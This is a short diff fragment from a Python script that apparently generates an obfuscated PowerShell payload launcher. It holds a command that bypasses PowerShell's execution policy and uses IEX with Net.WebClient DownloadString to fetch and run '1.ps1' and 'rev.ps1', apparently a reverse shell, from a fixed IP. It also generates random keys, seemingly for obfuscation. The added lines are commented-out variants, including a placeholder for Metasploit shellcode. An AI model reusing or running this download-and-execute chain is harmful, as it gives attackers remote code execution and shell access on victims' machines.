@@ -12,6 +12,8 @@ import base64
 ipAddr = ("192.168.21.128")
 pShell = ("powershell.exe &")
 sCode = (f"""-ep bypass -noexit IEX (New-Object Net.WebClient).DownloadString('http://{ipAddr}/1.ps1'); IEX (New-Object Net.WebClient).DownloadString('http://{ipAddr}/rev.ps1')   &""")
+#sCode = (f"""-ep bypass -noexit IEX (New-Object Net.WebClient).DownloadString('http://{ipAddr}/1.ps1');  &""")
+#msfShellcode = ('''aaaa''')
 key1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k =10)) 
 key2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k =10)) 
 key3 = ''.join(random.choices(string.ascii_uppercase + string.digits, k =10)) 
